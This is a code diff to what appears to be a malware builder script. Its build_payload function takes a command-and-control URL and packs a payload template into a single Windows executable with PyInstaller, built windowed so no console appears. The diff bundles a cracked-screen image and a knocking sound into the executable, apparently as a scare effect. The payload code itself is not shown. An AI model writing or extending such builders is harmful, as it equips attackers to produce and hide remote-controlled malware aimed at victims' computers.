@@ -9,6 +9,11 @@ def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: b
     template_path = os.path.join(script_dir, "payload_template.py")
     build_dir = os.path.join(script_dir, "build_temp")
     
+    # Define paths for resources
+    resources_dir = os.path.join(script_dir, "resources")
+    crack_img_path = os.path.join(resources_dir, "crack.png")
+    knock_sound_path = os.path.join(resources_dir, "knocking.mp3")
+    
     if os.path.exists(build_dir):
         shutil.rmtree(build_dir)
     os.makedirs(build_dir)
@@ -30,6 +35,12 @@ def build_payload(c2_url: str, output_dir: str, payload_name: str, debug_mode: b
             'pyinstaller', '--noconfirm', '--onefile',
             '--distpath', output_dir, '--name', payload_name
         ]
+        
+        # Add data files if they exist, bundling them into the exe's root
+        if os.path.exists(crack_img_path):
+            pyinstaller_cmd.append(f'--add-data={crack_img_path}{os.pathsep}.')
+        if os.path.exists(knock_sound_path):
+            pyinstaller_cmd.append(f'--add-data={knock_sound_path}{os.pathsep}.')
         
         if not debug_mode:
             pyinstaller_cmd.append('--windowed')
